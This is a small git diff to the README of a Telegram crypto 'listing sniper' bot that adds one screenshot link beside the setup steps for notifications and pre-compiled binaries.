@@ -13,6 +13,7 @@ The Telegram Listing Sniper Bot is designed to automatically buy newly listed to
 1. When launching the bot, enter your telegram id in the console and select which notifications you want to receive.
    - Coinmarketcap Fastest 
    - CoinGecko Fastest Alerts
+![](https://github.com/deadspyexx/listing-sniper-bot/assets/140325300/3681d9c5-e3db-4dbe-b73b-b9582ae99e9c)
 
 #### Configure the Sniper Bot
 1. Obtain the pre-compiled binaries from the "dist" folder. These binaries should work on any platform, including mobile devices.
